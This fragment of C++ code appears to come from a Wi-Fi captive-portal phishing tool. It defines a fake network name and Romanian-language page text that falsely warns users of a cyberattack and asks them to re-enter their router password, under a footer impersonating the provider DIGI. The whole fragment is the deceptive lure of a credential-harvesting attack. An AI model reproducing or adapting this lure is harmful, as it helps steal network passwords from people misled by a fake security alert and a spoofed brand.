...
// Default SSID name
const char* SSID_NAME = "Securoserv";

// Default main strings
#define SUBTITLE "Alerta atac cibernetc"
#define TITLE "Atentie"
#define BODY "Ati fost tinta unui atac cibernetic , din motive de securitate reintroduceti parola routerului!"
#define POST_TITLE "Verificare..."
#define POST_BODY "Routerul dumneavoastra este in siguranta.</br>Va multumim."
...
String footer() { 
  return "</div><div class=q><a>&#169;DIGI all rights reserved.</a></div>";
}
